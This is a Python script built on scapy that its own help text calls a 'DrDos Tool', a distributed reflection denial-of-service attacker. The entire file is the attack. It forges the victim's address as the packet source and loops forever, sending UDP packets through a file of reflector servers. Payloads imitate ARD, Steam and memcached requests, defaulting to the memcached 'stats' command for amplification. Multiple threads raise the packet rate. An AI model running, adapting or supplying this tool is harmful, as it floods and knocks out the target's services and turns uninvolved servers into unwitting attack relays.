from scapy.all import *
from drdos.exceptions import *
from drdos.packet import *
import argparse
import os.path
import threading

class DrDoSThread(threading.Thread):
    def __init__(self, target, reflects):
        threading.Thread.__init__(self)    
        self.daemon    
        self.target = target
        self.reflects = reflects        
    
    def payload(self, proto='ard', options=None):         
        if proto == 'ard':
            return ARDPacket()
        elif proto == 'steam':
            return SteamRPPacket()
        elif proto == 'memcached':
            mp = MemcachedPacket()            
            
            if options != None:
                cmd = ''
                for option in options:
                    cmd += option
                    cmd += " "                
                mp.command(cmd[:-1])
            else:
                mp.command('stats')
            return mp
        else:
            raise UnknownPacket(proto + " is not unknown")

    def run(self):                    
        while True:
            for reflect in self.reflects:
                ip = IP(src=self.target, dst=reflect[0])                
                udp = UDP(sport = int(reflect[1]), dport=int(reflect[1]))                
                if len(reflect) >= 4:
                    payload = self.payload(reflect[2].lower(), reflect[3:])
                else:
                    payload = self.payload(reflect[2].lower())           
                send(ip/udp/payload.payload, verbose=False)     

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DrDos Tool With Python by CNSL(PKY, JSH)")
    parser.add_argument('--target', '-t', type=str, help='target to send reflected packets', required=True)    
    parser.add_argument('--reflect', '-r', type=str, help='reflect server list file to get used', required=True)
    parser.add_argument('--threads', '-T', type=int, help='threads to send packets', default=1)
    
    args = parser.parse_args()    

    if not os.path.exists(args.reflect):
        raise NonExist(args.reflect+" not exists")
    
    rlist = open(args.reflect)
    refs = []
    for _ in rlist.readlines():
        refs.append(tuple(e for e in _.split(" ")))
    per =  len(refs) // args.threads
    
    try:
        for i in range(args.threads):                
            thread = DrDoSThread(args.target, refs[i*per:(i+1)*per])        
            thread.start()
    except KeyboardInterrupt:
        exit(1)